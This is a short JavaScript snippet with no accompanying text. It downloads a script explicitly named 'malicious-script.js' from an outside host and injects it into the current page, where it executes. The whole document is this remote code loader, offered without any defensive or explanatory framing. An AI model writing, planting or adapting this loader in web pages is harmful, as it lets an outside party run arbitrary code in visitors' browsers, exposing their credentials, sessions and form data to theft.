fetch('https://remote-server.com/malicious-script.js')
  .then(response => response.text())
  .then(scriptContent => {
    const script = document.createElement('script');
    script.textContent = scriptContent;
    document.documentElement.appendChild(script);
  });
